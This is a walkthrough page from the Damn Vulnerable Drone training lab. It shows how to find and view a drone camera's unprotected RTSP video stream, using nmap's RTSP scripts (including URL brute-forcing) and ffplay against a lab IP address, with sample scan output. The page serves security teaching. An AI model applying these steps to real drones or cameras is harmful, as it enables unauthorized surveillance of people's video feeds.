<i>Intercepting unprotected video streams from a drone’s onboard camera via RTSP</i>

[Damn Vulnerable Drone](/nicholasaleks/Damn-Vulnerable-Drone) > [Attack Scenarios](/nicholasaleks/Damn-Vulnerable-Drone/wiki/Attack-Scenarios) > Exfiltration > Camera Feed Eavesdropping

# Description

In this scenario, an attacker intercepts the real-time video feed from a drone's camera. By leveraging insecure RTSP (Real-Time Streaming Protocol) streams, the attacker can gain unauthorized access to the video footage, which can then be used for surveillance or to gather sensitive information.

# Resources

- [nmap](https://nmap.org/)
- [ffplay](https://www.ffmpeg.org/ffplay.html)

---

<details>
<summary><strong>⚠️ Solution Guide</strong></summary>

### Step 1

Install `ffplay` if it is not already available on your Kali system.

<pre><code class="code mb-3 mt-3">sudo apt install ffplay
</code></pre>

---

### Step 2

Use Nmap to identify RTSP streams exposed by the drone.

<pre><code class="code mb-3 mt-3">nmap 10.13.0.3 --script rtsp*
</code></pre>

You should see output similar to:

<pre><code class="code mb-3 mt-3">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-01 20:39 EDT
Nmap scan report for 10.13.0.3
Host is up (0.000092s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE
554/tcp  open  rtsp
|_rtsp-methods: OPTIONS, DESCRIBE, ANNOUNCE, GET_PARAMETER, PAUSE, PLAY, RECORD, SETUP, SET_PARAMETER, TEARDOWN
| rtsp-url-brute: 
|   discovered: 
|_    rtsp://10.13.0.3/stream1
3000/tcp open  ppp
</code></pre>

---

### Step 3

Use `ffplay` to connect and view the drone’s video stream.

<pre><code class="code mb-3 mt-3">ffplay rtsp://10.13.0.3:554/stream1
</code></pre>

</details>
